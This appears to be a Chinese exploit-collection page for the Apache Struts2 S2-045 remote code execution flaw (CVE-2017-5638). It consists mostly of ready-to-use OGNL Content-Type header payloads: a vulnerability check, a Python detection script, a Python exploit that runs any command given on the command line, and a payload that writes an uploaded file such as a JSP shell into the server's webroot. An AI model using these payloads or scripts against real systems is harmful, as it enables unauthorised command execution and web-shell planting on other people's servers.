---
title: 'Struts2 S2-045远程代码执行'
date: Mon, 24 Aug 2020 14:20:54 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响范围

Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10

#### 漏洞验证POC

```
Content-Type:%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}
```

![](Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200824214809.png)

#### 漏洞验证EXP

```
import requests
import sys
import httplib
def poc(url):
    httplib.HTTPConnection._http_vsn_str='HTTP/1.0'
    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
    headers = {}
    headers["Content-Type"] = payload
    r = requests.get(url, headers=headers)
    if "105059592" in r.content:
        return True
    return False

if __name__ == '__main__':
    if len(sys.argv) == 1:
        print "python s2-045.py target"
        sys.exit()
    elif poc(sys.argv[1]):
        print "vulnerable"
    else:
        print "not vulnerable"
```

![](Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/22222222222-1.png)

#### 命令执行POC

```
Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

![](Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/111.png)

#### 命令执行EXP

```
#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib

def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print("[*] struts2_S2-045.py <url> <cmd>")
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]
        cmd = sys.argv[2]
        print("[*] cmd: %s\n" % cmd)
        exploit(url, cmd)
```

![](Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3333333333333333333333333333.png)

#### GetShell POC（文件上传）

GET包修改为POST，添加参数?f=a.jsp，内容为想要上传的内容即可。

```
_multipart/form-data%{(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#f=new java.io.File(#req.getRealPath('/'),#req.getParameter('f'))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))}
```

![](Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/33333.png) ![](http://47.100.15.78/wp-content/uploads/2020/08/2222.png)